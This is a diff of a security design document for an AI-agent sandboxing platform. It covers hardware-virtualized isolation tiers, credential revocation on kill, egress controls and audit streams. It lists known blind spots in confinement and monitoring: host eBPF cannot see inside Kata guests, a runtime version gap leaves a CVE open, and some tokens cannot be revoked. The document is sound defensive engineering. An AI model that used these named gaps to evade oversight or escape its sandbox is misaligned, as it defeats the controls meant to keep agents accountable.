-- Interposes a KVM-backed hardware virtualization boundary (QEMU by default;
-  Cloud Hypervisor / `kata-clh` selectable via `WARDYN_CONFINEMENT_MAP`) between
-  the agent and the host kernel. A kernel 0-day inside the Kata guest does not
-  reach the host kernel.
-- Strongest isolation for adversarial workloads; required for cloud STS
-  federation and hostile multi-tenant deployments alongside the SPIRE identity
-  provider.
+- Interposes a KVM-backed hardware virtualization boundary (QEMU by default; Cloud
+  Hypervisor / `kata-clh` selectable via `WARDYN_CONFINEMENT_MAP`) between the
+  agent and the host kernel. A kernel 0-day inside the Kata guest does not reach
+  the host kernel.
+- Strongest isolation for adversarial workloads; required for cloud STS federation
+  and hostile multi-tenant deployments alongside the SPIRE identity provider.
 - Available on hosts where a Kata runtime is registered and `/dev/kvm` is present.
 - Install floor at Kata **v3.31.0** (`wardyn setup vault`) **[shipped]**: refuses
   (fail closed) to install an older release — whether resolved from GitHub's
   `latest` or an explicit `WARDYN_KATA_VERSION` override — closing
   CVE-2026-44210/-47243 (a permissive virtio-fs config lets a compromised Kata
   guest reach host-root via virtiofsd).
-- No pass-through for the dangerous `io.katacontainers.config.hypervisor.
-  virtio_fs_extra_args` / `kernel_params` override annotations **[shipped]**:
-  audited clean (no field on a run, policy, or composer proposal is
-  annotation-shaped) and denylisted defense-in-depth at the one chokepoint
-  that builds a launched container's `HostConfig` (`hardenedHostConfig`), so
-  neither knob can reach a Kata guest via any untrusted input.
+- No pass-through for the dangerous
+  `io.katacontainers.config.hypervisor.virtio_fs_extra_args` / `kernel_params`
+  override annotations **[shipped]**: audited clean (no field on a run, policy or
+  composer proposal is annotation-shaped) and denylisted defense-in-depth at the one
+  chokepoint that builds a launched container's `HostConfig` (`hardenedHostConfig`),
+  so neither knob can reach a Kata guest via any untrusted input.
 
 **What it does not stop:**
-- A hypervisor 0-day / VM-escape (rare; hardware-virt boundary is historically
+- A hypervisor 0-day / VM-escape (rare; the hardware-virt boundary is historically
   the most stable boundary in the stack, but not absolute).
 - The Kata v3.31.0 install floor above is enforced install-time only, by
-  `wardyn setup vault`'s installer. Once a `kata*` runtime is registered with
-  the Docker daemon, `pickRuntime` grants CC3 to it on name alone — there is no
-  running-daemon version probe, so a `kata*` runtime that reached the host by
-  any OTHER path (a pre-existing install, a manual downgrade, a golden image
-  built before v3.31.0) is granted CC3 with the CVE-2026-44210/-47243 gap
-  still open. The floor is a property of how Vault was installed, not a
-  property of the tier itself; a version probe in the runtime-selection path
-  is the closing fix (tracked, not yet built).
-- Host eBPF is blind to in-guest syscalls. Wardyn's eBPF/Tetragon
-  ground-truth audit stream **[shipped]** is a HOST sensor; for CC3/Kata
-  workloads it cannot see inside the guest and `wardyn-tetragon-ingest` emits a
-  one-time `kernel.sensor.blind` event (`data.reason="cc3-kata-host-ebpf-blind"`)
-  so the gap is VISIBLE rather than a silent absence. The mitigation — an
-  in-guest sensor for CC3, or orchestration-layer audit fallback — remains a
-  published gap (in-guest sensor is a v0.5 item).
+  `wardyn setup vault`'s installer. Once a `kata*` runtime is registered with the
+  Docker daemon, `pickRuntime` grants CC3 to it on name alone — there is no
+  running-daemon version probe, so a `kata*` runtime that reached the host by any
+  OTHER path (a pre-existing install, a manual downgrade, a golden image built
+  before v3.31.0) is granted CC3 with the CVE-2026-44210/-47243 gap still open. The
+  floor is a property of how Vault was installed, not of the tier itself; a version
+  probe in the runtime-selection path is the closing fix — tracked, not built.
+- Host eBPF is blind to in-guest syscalls. Wardyn's eBPF/Tetragon ground-truth
+  audit stream **[shipped]** is a HOST sensor; for CC3/Kata workloads it cannot see
+  inside the guest and `wardyn-tetragon-ingest` emits a one-time
+  `kernel.sensor.blind` event (`data.reason="cc3-kata-host-ebpf-blind"`) so the gap
+  is VISIBLE rather than a silent absence. The mitigation — an in-guest sensor for
+  CC3, or orchestration-layer audit fallback — remains a published gap.
 
 **Recommended use:** adversarial workloads, cloud STS federation, multi-tenant
-production deployments. Requires a registered Kata runtime and `/dev/kvm` on the host.
+production deployments. Requires a registered Kata runtime and `/dev/kvm` on the
+host.
 
 ---
 
 ## 8. Cross-Tier Controls (Always Active, Tier-Independent)
 
-The following controls apply regardless of Confinement Class:
-
 | Control | Layer | What it closes |
 |---|---|---|
-| No resident secrets | ID + L2 proxy-side injection + SecretRegistry late-binding + output masking on the brokered-upload/audit/proxy-log paths **[shipped]** (the optional `-out-dir` recording fallback is unmasked, the registry is process-local and fails open above one replica — both named in §4 — and there is a named, bounded set of resident-secret exceptions: §5.1a is the complete list) | AT-1.1: agent reading secrets from sandbox env/disk |
-| Env-var proxy bypass defended | L0 (gatewayless network; proxy env is compat-only, no route to bypass to) | Env-var proxy-bypass class |
-| Egress enforced outside the sandbox | L0/L1 | Mandatory because gVisor's in-sandbox iptables is partial; correct on all tiers |
-| Two enforcement planes (network B2 + tool B3) | L2 **[shipped]** + L3 **[v0.5+ — planned]** | The MCP-blind-firewall class — only the L2 half is active today; L3 does not exist yet, so this row is NOT "always active" for tool-call egress until L3 ships |
-| Approval mints credential | B5 coupling, ID + AU | Scope-widening between approval and issuance |
-| Kill-switch cascade (fires on EVERY run stop — kill, completion, failure, idle; BOTH paths win the state CAS FIRST (C002) before touching the runner or revoking anything, then teardown+revoke in opposite internal order — explicit-kill tears down before revoking, a non-kill stop revokes before tearing down — same steps, all fail-loud) | Sandbox teardown + run-token deny-list (embedded identity revocation) + broker credential revoke **[shipped]**; SPIRE entry deletion **[v0.5+ — planned]**. NOTE: GitHub installation tokens are TTL-bound (no per-token revoke API) — see residual #7. | Token hoarding past run end |
-| Attribution that distinguishes agent from human | ID, AU | Insider hiding behind agent identity |
-| Tamper-evident, free SIEM export | AU: Postgres log + PTY replay **[shipped]**, eBPF/Tetragon ground-truth stream **[shipped]** (detection-only; honestly degradable via `/healthz`; CC3/Kata host-blind gap surfaced as `kernel.sensor.blind`) | In-sandbox log tampering; audit vendor lock-in |
-| Fail-closed fleet policy | Audited policy changes (`policy.create/update/delete`) **[shipped]**; narrow-only managed settings (`disableBypassPermissionsMode`) **[v0.5+ — planned]** | Policy disablement before malicious action |
+| No resident secrets | ID + L2 proxy-side injection + SecretRegistry late-binding + output masking on the brokered-upload/audit/proxy-log paths 🟢 **[shipped]** (the optional `-out-dir` recording fallback is unmasked and the registry is process-local and fails open — both in §4.1 — and there is a named, bounded set of resident-secret exceptions: §5.1a is the complete list) | AT-1.1: agent reading secrets from sandbox env/disk |
+| Env-var proxy bypass defended | L0 🟢 **[shipped]** (gatewayless network; proxy env is compat-only, no route to bypass to) | Env-var proxy-bypass class |
+| Egress enforced outside the sandbox | L0/L1 🟢 **[shipped]** | Mandatory because gVisor's in-sandbox iptables is partial; correct on all tiers |
+| Two enforcement planes (network B2 + tool B3) | L2 🟢 **[shipped]** + L3 🟡 **[planned]** | The MCP-blind-firewall class — only the L2 half is active today; L3 does not exist yet, so this row is NOT "always active" for tool-call egress until L3 ships |
+| Approval mints credential | B5 coupling, ID + AU 🟢 **[shipped]** | Scope-widening between approval and issuance |
+| Kill-switch cascade (fires on EVERY run stop — kill, completion, failure, idle; BOTH paths win the state CAS FIRST (C002) before touching the runner or revoking anything, then teardown+revoke in opposite internal order — explicit-kill tears down before revoking, a non-kill stop revokes before tearing down — same steps, all fail-loud) | Sandbox teardown + run-token deny-list (embedded identity revocation) + broker credential revoke 🟢 **[shipped]**; SPIRE entry deletion 🟡 **[planned]**. NOTE: GitHub installation tokens are TTL-bound (no per-token revoke API) — see residual #7. | Token hoarding past run end |
+| Attribution that distinguishes agent from human | ID, AU 🟢 **[shipped]** | Insider hiding behind agent identity |
+| Tamper-evident, free SIEM export | AU 🟢 **[shipped]**: Postgres log + PTY replay, eBPF/Tetragon ground-truth stream (detection-only; honestly degradable via `/healthz`; CC3/Kata host-blind gap surfaced as `kernel.sensor.blind`) | In-sandbox log tampering; audit vendor lock-in |
+| Fail-closed fleet policy | Audited policy changes (`policy.create/update/delete`) 🟢 **[shipped]**; narrow-only managed settings (`disableBypassPermissionsMode`) 🟡 **[planned]** | Policy disablement before malicious action |
 
 ### The three audit streams, mechanically
 
@@ -1410,74 +1361,65 @@ flowchart LR
   s3 --> siem
 ```
 
-Control-plane events, masked PTY casts, and host-kernel ground truth all land
-append-only in Postgres keyed on `run_id` and fan out to SIEM for free — with
-the CC3 host-eBPF blind spot surfaced explicitly rather than hidden.
+Control-plane events, masked PTY casts and host-kernel ground truth all land
+append-only in Postgres keyed on `run_id` and fan out to SIEM for free — with the
+CC3 host-eBPF blind spot surfaced explicitly rather than hidden.
 
 ### The kill-switch cascade, mechanically
 
 The **explicit kill** path (`handleKillRun`) runs this fixed order:
 
-1. **Durable state transition** — compare-and-swap to KILLED from the state
-   just read. This runs FIRST (C002): a kill that loses the race to a
-   concurrent forward transition (e.g. a dispatch PENDING→STARTING) 409s
-   WITHOUT touching the runner or revoking anything, so it can never strip a
-   still-live run's credentials. Only the transition that actually WINS
-   KILLED proceeds to the steps below. An already-KILLED run is the one
-   exception to the terminal guard: re-kill CASes KILLED→KILLED (a value
-   no-op) and re-runs the idempotent steps below, so a first kill whose
-   teardown/revoke partially failed can be retried to actually free the
-   sandbox/credentials.
+1. **Durable state transition** — compare-and-swap to KILLED from the state just
+   read. This runs FIRST (C002): a kill that loses the race to a concurrent forward
+   transition (e.g. a dispatch PENDING→STARTING) 409s WITHOUT touching the runner or
+   revoking anything, so it can never strip a still-live run's credentials. Only the
+   transition that actually WINS KILLED proceeds. An already-KILLED run is the one
+   exception to the terminal guard: re-kill CASes KILLED→KILLED (a value no-op) and
+   re-runs the idempotent steps below, so a first kill whose teardown/revoke
+   partially failed can be retried to actually free the sandbox/credentials.
 2. **Sandbox teardown** — runner `KillSandbox`.
 3. **Run-token deny-list** — embedded identity revocation.
 4. **Broker credential revoke** — every minted credential for the run.
 
 Any of steps 2-4 failing is audited loudly (one `run.kill` event carrying the
-aggregate outcome, plus a distinct `run.revoke` failure event) instead of
-reporting containment — NOT fully contained, retry the kill. SPIRE entry
-deletion arrives with SPIRE **[v0.5+ — planned]**; GitHub installation tokens
-are TTL-bound (no per-token revoke API) — residual #7.
+aggregate outcome, plus a distinct `run.revoke` failure event) instead of reporting
+containment — NOT fully contained, retry the kill. SPIRE entry deletion arrives
+with SPIRE 🟡 **[planned]**; GitHub installation tokens are TTL-bound (no per-token
+revoke API) — residual #7.
 
 Non-kill stops (completion, failure, idle auto-stop) also win the durable-state
 compare-and-swap *first* — same C002 invariant, a lost CAS never revokes a
 still-live run — but the caller wins it BEFORE calling the shared
-`finalizeRunTail`, whose own internal order is audit → revoke → teardown (the
-REVERSE of explicit kill's teardown-before-revoke), and which audits
-`run.complete`/`run.reconcile` rather than `run.kill`. Unlike an explicit
-kill, a non-kill stop has no re-kill-style retry lane: a failed teardown/revoke
-step there is not automatically retried today (`SweepTerminalSandboxes` is an
-unwired primitive for exactly this gap — nothing calls it yet).
+`finalizeRunTail`, whose internal order is audit → revoke → teardown (the REVERSE
+of explicit kill's teardown-before-revoke), and which audits
+`run.complete`/`run.reconcile` rather than `run.kill`. A non-kill stop has no
+re-kill-style retry lane: a failed teardown/revoke step there is not
+automatically retried today (`SweepTerminalSandboxes` is an unwired primitive for
+exactly this gap — nothing calls it yet).
 
-**Verification note (2026-07-06):** re-checked against the shipped Docker
-driver to confirm the "egress enforced outside the sandbox" / "env-var proxy
-bypass defended" rows above are not, in fact, an iptables `REDIRECT`/TPROXY NAT
-rule — which would crash-loop under gVisor's netstack (no `nat` table). They
-are not: `grep -rn "REDIRECT\|TPROXY\|iptables"` across the Go tree returns no
-hits. Citations below name SYMBOLS, not line ranges — an earlier pass pinned
-line numbers and six of nine had rotted onto unrelated code (one past EOF) once
-the files were split. The actual mechanism is structural and tier-independent:
-
-1. The per-run Docker network is created with `Internal: true` (no gateway),
-   so the agent container has no default route regardless of confinement
-   class — the `NetworkCreate` in `CreateSandbox`
-   (`internal/runner/docker/driver.go`).
-2. The agent joins ONLY that network — `CreateSandbox` step (3) attaches it at
-   create time via `NetworkMode` + `NetworkingConfig`, never the host bridge
-   (same file); `HTTP_PROXY`/`HTTPS_PROXY` (`buildBaseSandboxEnv`,
-   `internal/api/runs_dispatch_mounts.go`) are set for proxy-aware clients as a
-   convenience, not the enforcement boundary.
-3. Under gVisor (CC2/`runsc`), Docker's embedded DNS resolver (127.0.0.11) is
-   not reachable from the sandbox's netstack, so the `wardyn-proxy` alias is
-   pinned via a static `ExtraHosts` entry instead — `agentHost.ExtraHosts` gets
-   `wardyn-proxy:<proxy IP>` and nothing else
-   (`internal/runner/docker/driver.go`) — the one place CC2 needs a real
-   adaptation, and it is a hosts-file entry, not a NAT rule.
+**Verification note (2026-07-06):** re-checked against the shipped Docker driver
+that the "egress enforced outside the sandbox" / "env-var proxy bypass defended"
+rows are not an iptables `REDIRECT`/TPROXY NAT rule — which would crash-loop under
+gVisor's netstack (no `nat` table). They are not:
+`grep -rn "REDIRECT\|TPROXY\|iptables"` across the Go tree returns no hits.
+Citations name SYMBOLS, not line ranges — an earlier pass pinned line numbers and
+six of nine had rotted onto unrelated code (one past EOF) once the files split.
+The mechanism is structural and tier-independent: (1) the per-run Docker network
+is created with `Internal: true` (no gateway), so the agent container has no
+default route regardless of confinement class — the `NetworkCreate` in
+`CreateSandbox` (`internal/runner/docker/driver.go`); (2) the agent joins ONLY that
+network — `CreateSandbox` step (3) attaches it at create time via `NetworkMode` +
+`NetworkingConfig`, never the host bridge, and `HTTP_PROXY`/`HTTPS_PROXY`
+(`buildBaseSandboxEnv`, `internal/api/runs_dispatch_mounts.go`) are a convenience
+for proxy-aware clients, not the enforcement boundary; (3) under gVisor
+(CC2/`runsc`) Docker's embedded DNS resolver (127.0.0.11) is unreachable from the
+sandbox's netstack, so the `wardyn-proxy` alias is pinned via a static
+`ExtraHosts` entry — `agentHost.ExtraHosts` gets `wardyn-proxy:<proxy IP>` and
+nothing else — a hosts-file entry, not a NAT rule.
 
 No fix was needed (there is no REDIRECT path to fix). Regression guard added:
 `TestCreateSandbox_TopologyPreservesL0UnderGVisor`
-(`internal/runner/docker/driver_test.go`) exercises `CreateSandbox` under CC2
-and asserts the `Internal=true` network and the static `wardyn-proxy` hosts
-entry both hold — the CC1 topology test
-(`TestCreateSandbox_TopologyPreservesL0`) never ran CC2, so this was the one
-gap in that guard.
-
+(`internal/runner/docker/driver_test.go`) exercises `CreateSandbox` under CC2 and
+asserts the `Internal=true` network and the static `wardyn-proxy` hosts entry both
+hold — the CC1 topology test (`TestCreateSandbox_TopologyPreservesL0`) never ran
+CC2, so this was the one gap in that guard.
